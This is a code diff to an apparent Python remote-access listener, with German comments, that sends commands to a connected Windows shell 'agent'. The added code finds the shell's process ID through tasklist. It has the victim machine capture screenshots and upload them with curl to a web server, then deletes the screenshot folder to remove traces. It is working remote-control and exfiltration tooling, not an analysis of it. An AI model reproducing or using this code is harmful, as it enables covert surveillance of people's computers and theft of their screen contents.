@@ -47,6 +47,7 @@ while True:
 
     clientsock, (ip,port) = sock.accept()
     print(f"[+] New Agent connect from {ip}:{port}")
+    print("[+] PID der Shell wird ermittelt..")
     threading.Thread(target=listening).start()
     
     CMDCODE = r'''
@@ -70,6 +71,17 @@ if(-not(Test-Path -Path "$env:TEMP\screenshot")){mkdir $env:TEMP\screenshot};^
 
 screenshot $bounds "$env:TEMP\screenshot\screenshot.png";'''
     
+    PID = ""
+    clientsock.send('title mycmd'.encode())
+    time.sleep(1)
+    clientsock.send('tasklist /v /fo csv | findstr /i "mycmd"'.encode())
+    antwort = clientsock.recv(65500).decode()
+    
+    antwortList = antwort.split(',')
+    PID = antwortList[1].strip('"')
+    print(f'[+] PID ist {PID}')
+    
+    
     while True:
         
         #try:
@@ -83,6 +95,7 @@ screenshot $bounds "$env:TEMP\screenshot\screenshot.png";'''
         command = input("Command:")
         showData = True
         if command.lower() == "exit":
+            clientsock.send("^C".encode())
             sock.close()
             print("Verbindung wird geschlossen.")
             break
@@ -101,9 +114,15 @@ screenshot $bounds "$env:TEMP\screenshot\screenshot.png";'''
             
             #Send Screenshot with curl to a Webserver
             curlCommand = f'curl -X POST -F "file=@{envTEMPconvertiert}/screenshot/screenshot.png" http://127.0.0.1:5000/upload' 
-            
             clientsock.send(curlCommand.encode())
-            clientsock.send()
+            
+            #Folder löschen nach upload
+            delCommand = f'rmdir /s /q {envTEMP.rstrip()}' + '\\screenshot'
+            clientsock.send(delCommand.encode())
+            
+            
+            
+            
             continue        
         
             
